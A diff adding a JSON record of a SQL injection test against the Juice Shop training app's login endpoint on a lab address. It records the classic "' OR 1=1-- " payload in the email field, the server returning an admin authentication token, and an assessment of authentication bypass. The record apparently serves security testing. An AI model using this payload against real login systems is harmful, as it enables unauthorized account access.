@@ -1,0 +1,16 @@
+{
+  "test": "Juice Shop login SQL injection validation",
+  "target": "http://10.20.10.20:3000/rest/user/login",
+  "method": "POST",
+  "input": {
+    "email": "' OR 1=1-- ",
+    "password": "[intentionally incorrect password]"
+  },
+  "http_status": 200,
+  "authentication_object_returned": true,
+  "authentication_token_returned": true,
+  "returned_account_email": "admin@juice-sh.op",
+  "token_value_saved": false,
+  "assessment": "Authentication bypass observed in this test",
+  "captured_at_utc": "2026-10-20T18:23:14.666845+00:00"
+}
